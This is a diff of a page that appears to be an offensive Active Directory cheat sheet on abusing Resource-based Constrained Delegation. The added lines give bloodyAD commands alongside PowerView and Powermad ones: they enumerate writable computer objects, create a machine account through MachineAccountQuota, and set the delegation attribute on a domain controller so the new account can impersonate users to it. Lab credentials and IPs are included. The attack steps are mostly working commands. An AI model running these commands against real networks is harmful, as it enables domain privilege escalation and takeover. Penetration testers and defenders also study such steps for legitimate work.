@@ -19,12 +19,18 @@ Resource-based Constrained Delegation was introduced in Windows Server 2012.
     $ACE = Get-DomainObjectACL dc01-ww2.factory.lan | ?{$_.SecurityIdentifier -match $AttackerSID}
     $ACE
     ConvertFrom-SID $ACE.SecurityIdentifier
+
+    # alternative (Windows/Linux)
+    bloodyAD -u user -p 'totoTOTOtoto1234*' -d crash.lab --host 10.100.10.5 get writable --otype COMPUTER --detail | egrep -i 'distinguishedName|msds-allowedtoactonbehalfofotheridentity'
     ```
 
 3. Abuse **MachineAccountQuota** to create a computer account and set an SPN for it
 
     ```powershell
     New-MachineAccount -MachineAccount swktest -Password $(ConvertTo-SecureString 'Weakest123*' -AsPlainText -Force)
+
+    # alternative (Windows/Linux)
+    bloodyAD -u user -p 'totoTOTOtoto1234*' -d crash.lab --host 10.100.10.5 add computer swktest 'Weakest123*'
     ```
 
 4. Rewrite DC's **AllowedToActOnBehalfOfOtherIdentity** properties
@@ -38,6 +44,10 @@ Resource-based Constrained Delegation was introduced in Windows Server 2012.
     $RawBytes = Get-DomainComputer dc01-ww2.factory.lan -Properties 'msds-allowedtoactonbehalfofotheridentity' | select -expand msds-allowedtoactonbehalfofotheridentity
     $Descriptor = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList $RawBytes, 0
     $Descriptor.DiscretionaryAcl
+
+    # alternative (Windows/Linux)
+    # use 'remove' instead of 'add' after exploit
+    bloodyAD --host 10.1.0.4 -u user -p 'totoTOTOtoto1234*' -d crash.lab add rbcd 'dc01-ww2$' 'swktest$'
     ```
 
     ```ps1
